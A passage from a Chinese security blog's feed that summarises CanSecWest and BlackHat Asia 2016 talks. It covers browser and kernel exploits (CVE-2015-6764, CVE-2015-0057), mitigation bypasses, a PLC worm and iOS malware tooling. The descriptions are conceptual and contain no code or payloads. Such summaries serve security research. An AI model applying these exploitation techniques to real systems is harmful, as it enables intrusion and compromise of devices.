&lt;p&gt;分享自动生成利用代码的工具AEG，主要针对混合读写操作导致的漏洞，通过PIN进行指令插桩，利用符号执行（Symbolic Execution）和混合执行（Concolic Execution）一块去实现程序的动态分析与利用代码生成。&lt;br&gt;&lt;strong&gt;PS：整体思路跟以往挖掘漏洞中用于分析代码执行路径，增加代码覆盖率的思路一致，用在漏洞挖掘与分析上比较可行，但自动生成利用代码估计效果不好。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;4、《Pwn-a-Nexus-device-with-a-single-vulnerability》&quot;&gt;&lt;a href=&quot;#4、《Pwn-a-Nexus-device-with-a-single-vulnerability》&quot; class=&quot;headerlink&quot; title=&quot;4、《Pwn a Nexus device with a single vulnerability》&quot;&gt;&lt;/a&gt;4、《Pwn a Nexus device with a single vulnerability》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605317938560.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来自360的分享，是其在Pwn2Own Mobile 2015上用于攻破Nexus手机的chrome浏览器漏洞CVE-2015-6764。议题对该漏洞的成因、利用和补丁代码都进行了分析，是一个越界访问漏洞，通过越界读写内存造成地址泄露，从而再绕过ASLR。该议题提到的利用方式（&lt;strong&gt;RCE2UXSS、UXSS2RCE&lt;/strong&gt;）比较奇妙,在利用漏洞获取执行代码的权限后，&lt;strong&gt;通过hook ScriptLoader::executeScript去注入Javascript代码，然后在 &lt;a href=&quot;https://play.goolge.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://play.goolge.com&lt;/a&gt; 域下通过JS去安装任意APP&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&quot;5、《BadWinmail-and-Email-Security-on-Outlook》&quot;&gt;&lt;a href=&quot;#5、《BadWinmail-and-Email-Security-on-Outlook》&quot; class=&quot;headerlink&quot; title=&quot;5、《BadWinmail and Email Security on Outlook》&quot;&gt;&lt;/a&gt;5、《BadWinmail and Email Security on Outlook》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605992256618.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在msg文件格式中嵌入OLE对象，然后更改CLSID为Flash控件或者PDF控件，利用这些控件的漏洞直接实现利用。另外还可传输不确定封装格式 (TNEF，附件名为winmail.dat) ，它也支持OLE，然后采用上述相同攻击方法实现利用。用户在使用Outlook打开上述邮件时即可直接执行任意代码。&lt;/p&gt;
&lt;h3 id=&quot;6、《Getting-Physical-Extreme-abuse-of-Intel-based-Paging-Systems》&quot;&gt;&lt;a href=&quot;#6、《Getting-Physical-Extreme-abuse-of-Intel-based-Paging-Systems》&quot; class=&quot;headerlink&quot; title=&quot;6、《Getting Physical Extreme abuse of Intel based Paging Systems》&quot;&gt;&lt;/a&gt;6、《Getting Physical Extreme abuse of Intel based Paging Systems》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14606052304309.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;讲述利用操作系统的分页机制去绕过各种内核安全机制，比如DEP、KASLR、NULL解引用保护、SMEP等等，主要针对Linux与Windows，并提供有demo代码。传统方法可能更多的是借助信息泄露漏洞，利用泄露地址去绕过上述保护，利用他们提供的方法甚至可允许非特权用户dump到内核访问的物理内存。主要利用以下缺陷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分页表位于固定虚拟地址（Windows）；&lt;/li&gt;
&lt;li&gt;分页表可写(Windows);&lt;/li&gt;
&lt;li&gt;PDPTs、PDs与PTs位于固定虚拟地址（Linux）;&lt;/li&gt;
&lt;li&gt;分页结构可写（Linux)。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;比如Windows上，可以利用任意写地址漏洞去将PTE分页表（固定地址）中的指针修改为HAL堆上的物理内存地址,HAL堆上包含有一堆函数指针，包括hal!HalpApicRequestInterrupt函数，最后结合ROP就可以禁用SMEP保护，最终获得系统权限。还有其它页目录堆喷的利用方式，Linux上稍有不同，但攻击思路类似。&lt;/p&gt;
&lt;h3 id=&quot;7、《Execute-My-Packet-Exodus-of-Shells-from-a-Firewall-》&quot;&gt;&lt;a href=&quot;#7、《Execute-My-Packet-Exodus-of-Shells-from-a-Firewall-》&quot; class=&quot;headerlink&quot; title=&quot;7、《Execute My Packet (Exodus of Shells from a Firewall)》&quot;&gt;&lt;/a&gt;7、《Execute My Packet (Exodus of Shells from a Firewall)》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14606157550780.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Cisco ASA Adaptive Security Appliance是个IP路由器，具备防火墙、反病毒、入侵检测和VPN服务器的功能，它的IKE(网络密钥交换)版本v1和v2存在堆溢出漏洞（CVE-2016-1287），利用漏洞允许未授权的用户实现远程代码执行。该议题分析了导致漏洞的成因以及利用方法，目前官方已修复此漏洞。&lt;/p&gt;
&lt;h3 id=&quot;8、《Bypassing-Different-Defense-Schemes-via-Crash-Resistant-Probing-of-Address-Space》&quot;&gt;&lt;a href=&quot;#8、《Bypassing-Different-Defense-Schemes-via-Crash-Resistant-Probing-of-Address-Space》&quot; class=&quot;headerlink&quot; title=&quot;8、《Bypassing Different Defense Schemes via Crash-Resistant Probing of Address Space》&quot;&gt;&lt;/a&gt;8、《Bypassing Different Defense Schemes via Crash-Resistant Probing of Address Space》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14606192691752.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者在不借助地址泄露的情况下，使用“崩溃恢复”（Crash-Resistant）功能去绕过DEP、ASLR、CFG等多个安全机制。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;通过内存扫描获取地址&lt;/strong&gt;：结合堆喷射，利用漏洞篡改数据类型相关（比如整数）的1个字节，从而伪造出JS对象，接着在web worker中使用setInerval函数去使用伪造的JS对象，这里使用setInerval是为了使用Crash-Resistant功能，有了JS对象就有了可控的虚表指针，再通过扫描内存获取TEB（线程环境块）基址、DLL基址等信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;创建Blob对象来绕过EAF+&lt;/strong&gt;：另外还演示了如何绕过EMEt 5.5 的EAF和EAF+保护，作者通过创建Blob对象来解决，因为它会调用到未在EAF+黑名单里面的ntdll模块，进而解决导出表的安全限制问题。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;利用函数链（Function Chaining）绕过CFG&lt;/strong&gt;：在控制虚表函数指针后，利用5个未被EMET禁用的导出函数（利用networkx 和miasm2工具去搜索的），依次调用组成一个函数调用链，最终调用LdrInitShimEngineDynamic([fakeStr + 0x8] + 0x20, [fakeStr] + 0x18)，这里的两个参数都是可控的，从而实现任意DLL的加载。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;9、《Virtualization-Device-Emulator-Testing-Technology》&quot;&gt;&lt;a href=&quot;#9、《Virtualization-Device-Emulator-Testing-Technology》&quot; class=&quot;headerlink&quot; title=&quot;9、《Virtualization Device Emulator Testing Technology》&quot;&gt;&lt;/a&gt;9、《Virtualization Device Emulator Testing Technology》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14606253312145.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;通过分析虚拟设备模拟器的攻击面，主要针对各个硬件虚拟组件进行Fuzzing，通过系统hook模块去获取各个设备模拟器，然后从服务端向各个模拟器客户端发送畸形数据，再根据客户端返回的日志进行分析。&lt;/p&gt;
&lt;h3 id=&quot;10、《Hardsploit-project-All-In-One-Tool-for-Hardware-Security-Audit》&quot;&gt;&lt;a href=&quot;#10、《Hardsploit-project-All-In-One-Tool-for-Hardware-Security-Audit》&quot; class=&quot;headerlink&quot; title=&quot;10、《Hardsploit project : All-In-One Tool for Hardware Security Audit》&quot;&gt;&lt;/a&gt;10、《Hardsploit project : All-In-One Tool for Hardware Security Audit》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14606908008051.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Hardsploit项目是一个硬件安全审计框架，支持多种硬件接口，比如I2C, JTAG, SPI, PARALLEL, UART，主要应用在物联网产品的安全审计上。通过工具可以提取存储在芯片上各种数据，读写以及嗅探传输数据，便于后续作分析，而且还提供有界面、API接口等等功能。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本周分析的安全大会主要以2016年CanSecWest黑客大会上的精彩议题为主，整体上，议题主要偏向于&lt;strong&gt;系统/软件漏洞挖掘与利用技术&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;各议题下载链接参见：&lt;a href=&quot;http://www.slideshare.net/C
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="CanSecWest" scheme="http://riusksk.github.io/tags/CanSecWest/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat Asia 2016 大会议题分析报告</title>
    <link href="http://riusksk.github.io/2016/04/05/bh-asia-2016/"/>
    <id>http://riusksk.github.io/2016/04/05/bh-asia-2016/</id>
    <published>2016-04-05T02:27:11.000Z</published>
    <updated>2016-06-05T02:44:38.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;1、《A-New-CVE-2015-0057-Exploit-Technology》&quot;&gt;&lt;a href=&quot;#1、《A-New-CVE-2015-0057-Exploit-Technology》&quot; class=&quot;headerlink&quot; title=&quot;1、《A New CVE-2015-0057 Exploit Technology》&quot;&gt;&lt;/a&gt;1、《A New CVE-2015-0057 Exploit Technology》&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598336783953.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来自FireEye公司分享的一种针对微软内核 win32k!xxxEnableWndSBArrows tagSBINFO/tagPROPLIST UAF漏洞CVE-2015-0057/MS15-010的利用方法，是被FireEye捕获到的一款Dyre银行木马变种所采用的利用技术,分为32位和64位不同平台下的方法。&lt;br&gt;&lt;strong&gt;【传统攻击方法】&lt;/strong&gt;：原有的攻击方法是由NCC Group安全组织公布的，采用”占坑“的攻击方式，用可控数据去填充已释放的tagPROPLIST，然后在32位下用SetScrollInfo去操作指向tagWND.strName.Buffer的tagWND.pSBInfo，而在64位下伪造的堆头结构_HEAP_ENTRY去指向tagWND.strName.Buffer，完成数据的覆盖，从而转化为任意地址读写。&lt;br&gt;&lt;strong&gt;【新型攻击方法】&lt;/strong&gt;：在32位系统下，== 采用tagMENU对象去填充已tagPROPLIST，然后借助tagMENU.cItems和tagMENU.rgItems来完成控制 ==;而在64位系统下，既借鉴了NCC使用tagWND去操作tagPROPLIST，又使用tagMENU去覆盖tagMENU.rgItems，因为rgItems数组指针指向的第一个元素是wID，通过SetMenuItemInfo()可实现完全控制,最终实现任意地址读写。&lt;/p&gt;
&lt;h3 id=&quot;2、《Automated-Detection-Of-Firefox-Extension-reuse-Vulnerabilities》&quot;&gt;&lt;a href=&quot;#2、《Automated-Detection-Of-Firefox-Extension-reuse-Vulnerabilities》&quot; class=&quot;headerlink&quot; title=&quot;2、《Automated Detection Of Firefox Extension-reuse Vulnerabilities》&quot;&gt;&lt;/a&gt;2、《Automated Detection Of Firefox Extension-reuse Vulnerabilities》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598369926110.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;东北大学（美国）的4位安全研究员开发出一款叫CrossFire的轻量级静态分析工具，用于自动化挖掘Firefox插件漏洞（对方称为”Externsion-reuse“漏洞），其实就是利用插件原有的敏感功能去执行恶意行为，比如窃取cookie、历史记录等敏感信息。Firefox插件是通过Javascript调用Friefox提供的API实现的附加功能，因此CrossFire是通过静态分析插件的JS代码，构建出抽象语法树，然后跟收集的敏感API数据库做综合分析，API数据库就是定义输入源（source）和输出目标（sink）的内容，然后基于污点传播的思路去做判断，如果检测到漏洞还可以根据原定规则生成exploit。&lt;br&gt;&lt;strong&gt;【PS】&lt;/strong&gt;:==基于污点传播的静态分析思路，偏学术研究，估计误报会比较多，往往还需要人工介入排查，效果不见得会很好。==&lt;/p&gt;
&lt;h3 id=&quot;3、《Break-Out-Of-The-Truman-Show：Active-Detection-And-Escape-Of-Dynamic-Binary-Instrumentation》&quot;&gt;&lt;a href=&quot;#3、《Break-Out-Of-The-Truman-Show：Active-Detection-And-Escape-Of-Dynamic-Binary-Instrumentation》&quot; class=&quot;headerlink&quot; title=&quot;3、《Break Out Of The Truman Show：Active Detection And Escape Of Dynamic Binary Instrumentation》&quot;&gt;&lt;/a&gt;3、《Break Out Of The Truman Show：Active Detection And Escape Of Dynamic Binary Instrumentation》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598401954245.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;关于动态二进制插桩的检测与逃逸方法，用来对抗程序被动态分析,主要针对PIN与DynamoRIO两款插桩工具的特点进行分析。&lt;br&gt;&lt;strong&gt;【检测方法】&lt;/strong&gt;：分主动与被动检测方案，主动检测包括扩展的指令代码（Xmode Code，会导致栈桢大小不同）、代码缓存、TLS和异常上下文，而被动检测包括未支持的指令和行为功能。&lt;br&gt;&lt;strong&gt;【逃逸方法】&lt;/strong&gt;：通过代码缓存进行自修改，以及一些栈、TLS和其它DBI框架特有的数据结构，比如.charmve段、BrokerClient回调函数等等方法入手。&lt;/p&gt;
&lt;h3 id=&quot;4、《Bypassing-Browser-Security-Policies-For-Fun-And-Profit》&quot;&gt;&lt;a href=&quot;#4、《Bypassing-Browser-Security-Policies-For-Fun-And-Profit》&quot; class=&quot;headerlink&quot; title=&quot;4、《Bypassing Browser Security Policies For Fun And Profit》&quot;&gt;&lt;/a&gt;4、《Bypassing Browser Security Policies For Fun And Profit》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598412838122.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;讲述Android浏览器绕过同源策略的UXSS漏洞，都是以一些历史漏洞为例讲解漏洞的利用方式（含PoC）,包括窃取cookie、读取本地文件，以及绕过Google Play的限制实现任意app的安装。==议题主要是对过去漏洞的总结，并没有太多新颖的思路。==&lt;/p&gt;
&lt;h3 id=&quot;5、《DSCompromised-A-Windows-DSC-Attack-Framework》&quot;&gt;&lt;a href=&quot;#5、《DSCompromised-A-Windows-DSC-Attack-Framework》&quot; class=&quot;headerlink&quot; title=&quot;5、《DSCompromised: A Windows DSC Attack Framework》&quot;&gt;&lt;/a&gt;5、《DSCompromised: A Windows DSC Attack Framework》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598431026382.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;DSC（Desired State Configuration，期望状态配置）是Windows上的配置管理平台，它通过向PowerShell语言中引进一个非常简单的语法声明，和一个用来接收和应用这些配置的内置引擎来实现的。DSCompromised即是一款基于PowerShell的工具，用于借助DSC来实现命令控制、恶意软件驻留、回连后门等等功能。该工具已在github上开源：&lt;a href=&quot;https://github.com/matthastings/DSCompromised。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/matthastings/DSCompromised。&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;6、《Enterprise-Apps-Bypassing-The-iOS-Gatekeeper》&quot;&gt;&lt;a href=&quot;#6、《Enterprise-Apps-Bypassing-The-iOS-Gatekeeper》&quot; class=&quot;headerlink&quot; title=&quot;6、《Enterprise Apps: Bypassing The iOS Gatekeeper》&quot;&gt;&lt;/a&gt;6、《Enterprise Apps: Bypassing The iOS Gatekeeper》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598447131786.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;介绍iOS企业证书滥用的问题，并列举近年来出现过一些大的iOS安全事件，比如”假面攻击“、WireLurker病毒等等案例，同时讲述其它存在的风险，==比如通过中间人方式去劫持企业的移动设备管理服务器，然后替换请求安装的app，从而使得用户安装被企业证书签名过的恶意软件==。&lt;/p&gt;
&lt;h3 id=&quot;7、《Exploiting-Linux-and-PaX-ASLR’s-weaknesses-on-32-bit-and-64-bit-systems》&quot;&gt;&lt;a href=&quot;#7、《Exploiting-Linux-and-PaX-ASLR’s-weaknesses-on-32-bit-and-64-bit-systems》&quot; class=&quot;headerlink&quot; title=&quot;7、《Exploiting Linux and PaX ASLR’s weaknesses on 32-bit and 64-bit systems》&quot;&gt;&lt;/a&gt;7、《Exploiting Linux and PaX ASLR’s weaknesses on 32-bit and 64-bit systems》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598465162889.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;列举出当前Linux和PaX(用于安全加固的Linux内核补丁)平台上的ASLR绕过漏洞，共有4个问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;==低熵==，即地址随机度不够，可被暴力破解，尤其是32位系统&lt;/li&gt;
&lt;li&gt;==非均匀分布随机地址==，呈驼峰型分布，因此有部分地址存在高命中率&lt;/li&gt;
&lt;li&gt;==利用对象间的相对地址偏移实现绕过==，即Offset2Lib攻击方法&lt;/li&gt;
&lt;li&gt;==进程继承缺陷==，所有子进程共享相同的内存&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后提出下一代ASLR防护机制：ASLR-NG，以解决上述问题。&lt;/p&gt;
&lt;h3 id=&quot;8、《Hacking-a-Professional-Drone》&quot;&gt;&lt;a href=&quot;#8、《Hacking-a-Professional-Drone》&quot; class=&quot;headerlink&quot; title=&quot;8、《Hacking a Professional Drone》&quot;&gt;&lt;/a&gt;8、《Hacking a Professional Drone》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598494382580.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;议题中提出两种攻击无人机的方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;==破解WEP加密的WiFi密码==，直接接入与遥控器通讯；&lt;/li&gt;
&lt;li&gt;==伪造XBee 868LP通讯设备作为中间人==，发送控制指令（逆向Android客户端获得指令序列），从而实现无人机的劫持&lt;br&gt;&lt;strong&gt;【PS】&lt;/strong&gt;：==从攻击难度看，此款无人机的安全性比较低，跟大疆无人机存在较大差距==。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;9、《Hey-your-parcel-looks-bad-fuzzing-and-exploiting-parcel-ization-vulnerabilities-in-Android》&quot;&gt;&lt;a href=&quot;#9、《Hey-your-parcel-looks-bad-fuzzing-and-exploiting-parcel-ization-vulnerabilities-in-Android》&quot; class=&quot;headerlink&quot; title=&quot;9、《Hey your parcel looks bad - fuzzing and exploiting parcel-ization vulnerabilities in Android》&quot;&gt;&lt;/a&gt;9、《Hey your parcel looks bad - fuzzing and exploiting parcel-ization vulnerabilities in Android》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599077404076.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;由于KeenLab分享的Android Binder Fuzzing相关的议题，分析出Binder存在的攻击面，然后制定相应的Fuzzing策略。&lt;br&gt;&lt;strong&gt;【亮点一】&lt;/strong&gt;：==从Android C++源码中自动化提取各Binder服务通讯中的 Transaction Code、参数类型及序号、远程服务的调用方式，然后生成json文件，依据它来作参数变异==。如果是闭源的Binder服务，比如华为手机，则通过IDAPython从程序中提取上述信息。&lt;br&gt;&lt;strong&gt;【亮点二】&lt;/strong&gt;：==开启ASAN（AddressSanitize）去编译源码==，加强程序自主的错误检测能力，同时==结合AFL==（Google开发的一款基于源码插桩的Fuzzer工具，曾被用于刷过N多CVE漏洞）去做Fuzzing，==但AFL是基于文件输入的，而Binder未提供此功能，因此KeenLab也未完全实现，这是他们一直在尝试做的工作==。&lt;br&gt;&lt;strong&gt;【亮点三】&lt;/strong&gt;：最后以几个Binder服务漏洞作为实例分析漏洞成因，并分享了CVE-2015-6620 MediaCodecInfo 越界访问漏洞的利用技巧，采用ROP与Heap Spray去绕过NX与ASLR。&lt;/p&gt;
&lt;h3 id=&quot;10、《I’m-Not-a-Human-Breaking-the-Google-reCAPTCHA》&quot;&gt;&lt;a href=&quot;#10、《I’m-Not-a-Human-Breaking-the-Google-reCAPTCHA》&quot; class=&quot;headerlink&quot; title=&quot;10、《I’m Not a Human: Breaking the Google reCAPTCHA》&quot;&gt;&lt;/a&gt;10、《I’m Not a Human: Breaking the Google reCAPTCHA》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599122751659.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Google的reCAPTCHA是一款验证码生成系统，作者分享了一些绕过该验证码系统的方法。比如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过深度学习为图片注释，使用基于Word2Vec神经网络进行深度学习去为图片标记归类&lt;/li&gt;
&lt;li&gt;收集样本图片、提示信息、注释标签等信息&lt;/li&gt;
&lt;li&gt;通过Google服务（图片搜索、翻译等）获取关键词&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;11、《Let’s-See-What’s-Out-There-Mapping-The-Wireless-IOT》&quot;&gt;&lt;a href=&quot;#11、《Let’s-See-What’s-Out-There-Mapping-The-Wireless-IOT》&quot; class=&quot;headerlink&quot; title=&quot;11、《Let’s See What’s Out There - Mapping The Wireless IOT》&quot;&gt;&lt;/a&gt;11、《Let’s See What’s Out There - Mapping The Wireless IOT》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599134045481.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;分享物联网产品中常用的无线电安全问题，比如ZigBee、WiFi、GSM、NFC、车钥匙信号等等。介绍分析无线电的硬件、软件工具，以及常见的TOP 10无线安全问题，前3名分别是：未加密通讯、信息重放攻击、密钥交换漏洞。&lt;br&gt;==【PS】:主要是无线电安全的基础知识的概述，工具和常见漏洞类型等等，无实例漏洞分析，里面涉及的内容，预研侧此前大多有分析过。==&lt;/p&gt;
&lt;h3 id=&quot;12、《PLC-Blaster：A-Worm-Living-Solely-in-the-PLC》&quot;&gt;&lt;a href=&quot;#12、《PLC-Blaster：A-Worm-Living-Solely-in-the-PLC》&quot; class=&quot;headerlink&quot; title=&quot;12、《PLC-Blaster：A Worm Living Solely in the PLC》&quot;&gt;&lt;/a&gt;12、《PLC-Blaster：A Worm Living Solely in the PLC》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599217768327.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者开发出一款叫PLC-Blaster的PLC（可编程控制器）蠕虫病毒，以西门子S7-1200版本1到3的PLC为例。西门子PLC使用自定义协议去上传和下载用户程序到PLC，也可以读取PLC相关诊断信息，因此常被用作攻击PLC的手段之一。此款PLC病毒使用SCL编程语言实现的，它会去扫描本地网络，若发现其它PLC则会上传病毒进行感染，实现自我传播的功能。同时它还会主动连接C&amp;amp;C服务器，以实现远程控制功能。&lt;br&gt;==【PS】：难点就在于对S7-1200 PLC的协议分析，只有分析清楚之后，才能使用SCL去实现自我传播的功能。==&lt;/p&gt;
&lt;h3 id=&quot;13、《Practical-New-Developments-In-The-BREACH-Attack》&quot;&gt;&lt;a href=&quot;#13、《Practical-New-Developments-In-The-BREACH-Attack》&quot; class=&quot;headerlink&quot; title=&quot;13、《Practical New Developments In The BREACH Attack》&quot;&gt;&lt;/a&gt;13、《Practical New Developments In The BREACH Attack》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599232870147.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;分享关于SSL BREACH（超文本自适应压缩浏览器勘测与渗透）攻击方法的新进展，BREACH攻击方法最初是在&lt;a href=&quot;http://breachattack.com/resources/BREACH%20-%20SSL,%20gone%20in%2030%20seconds.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;BlackHat USA 2013大会&lt;/a&gt;被公布的。作者开发出一款叫”rupture“的攻击框架，并在&lt;a href=&quot;https://github.com/dionyziz/rupture&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;github&lt;/a&gt;上开源，用于实现改进后的BREACH攻击，以及针对其它压缩加密算法的攻击。&lt;/p&gt;
&lt;h3 id=&quot;14、《The-Perl-Jam-2-The-Camel-Strikes-Back》&quot;&gt;&lt;a href=&quot;#14、《The-Perl-Jam-2-The-Camel-Strikes-Back》&quot; class=&quot;headerlink&quot; title=&quot;14、《The Perl Jam 2: The Camel Strikes Back》&quot;&gt;&lt;/a&gt;14、《The Perl Jam 2: The Camel Strikes Back》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599279606791.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Perl在之前被发现存在多个高危漏洞，而官方一直将问题归结于开发者，作者表示很气愤，认为这个锅不应该由开发者来背。于是，作者分享了他发现的存在于perl核心模块0day漏洞，此漏洞影响所有使用perl开发CGI的程序，可造成远程代码执行。&lt;/p&gt;
&lt;h3 id=&quot;15、《Su-A-Cyder：Homebrewing-Malware-For-iOS-Like-A-B0SS》&quot;&gt;&lt;a href=&quot;#15、《Su-A-Cyder：Homebrewing-Malware-For-iOS-Like-A-B0SS》&quot; class=&quot;headerlink&quot; title=&quot;15、《Su-A-Cyder：Homebrewing Malware For iOS Like A B0SS》&quot;&gt;&lt;/a&gt;15、《Su-A-Cyder：Homebrewing Malware For iOS Like A B0SS》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599250665173.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;分享==非越狱iOS平台==上的恶意软件相关的议题，列举过去的发生的一些案例，然后总结出一些恶意软件的常用工具和方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;==重打包==：在正常应用中加入恶意代码，然后重新签名打包&lt;/li&gt;
&lt;li&gt;==Dylib注入==&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/BishopFox/theos-jailed&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Cycript&lt;/a&gt;：支持javascript和OC语法的解析工具，可用于调试运行时程序，支持越狱与非越狱平台&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/BishopFox/theos-jailed&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Theos&lt;/a&gt;：iOS平台上的Hook框架，支持越狱与非越狱平台，但仍需要开发者帐号用于签名，详见：====&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/fastlane/fastlane&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Fastlane tools&lt;/a&gt;：iOS开发的持续集成框架，用于实现实现应用发布流程的自动化。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后作者开源出一款叫”==&lt;a href=&quot;https://github.com/fastlane/fastlane&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Su-A-Cyder&lt;/a&gt;==“的iOS恶意软件生成工具，后面作者还打算尝试将Metasploit移植到未越狱的iOS平台上。&lt;/p&gt;
&lt;h3 id=&quot;16、《The-Security-Wolf-Of-Wall-Street-Fighting-Crime-With-High-Frequency-Classfication-And-Natural-Language-Processing》&quot;&gt;&lt;a href=&quot;#16、《The-Security-Wolf-Of-Wall-Street-Fighting-Crime-With-High-Frequency-Classfication-And-Natural-Language-Processing》&quot; class=&quot;headerlink&quot; title=&quot;16、《The Security Wolf Of Wall Street: Fighting Crime With High-Frequency Classfication And Natural Language Processing》&quot;&gt;&lt;/a&gt;16、《The Security Wolf Of Wall Street: Fighting Crime With High-Frequency Classfication And Natural Language Processing》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599283806453.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者分享了如何利用深度学习与自然语言处理去建立一个基于实时分析海量DNS数据的威胁监控框架，主要用于检测恶意钓鱼的域名站点，并发现了不少伪造Google、Apple、Paypal等知名站点的钓鱼网站。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1、《A-New-CVE-2015-0057-Exploit-Technology》&quot;&gt;&lt;a href=&quot;#1、《A-New-CVE-2015-0057-Exploit-Technology》&quot; class=&quot;headerlink&quot; title=&quot;1、《A New
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="BlackHat" scheme="http://riusksk.github.io/tags/BlackHat/"/>
    
  </entry>
  
  <entry>
    <title>购书心得</title>
    <link href="http://riusksk.github.io/2014/03/21/buybook/"/>
    <id>http://riusksk.github.io/2014/03/21/buybook/</id>
    <published>2014-03-20T16:00:00.000Z</published>
    <updated>2016-06-18T12:16:18.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/buybook/643451796777498842.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;/center&gt;&lt;/p&gt;
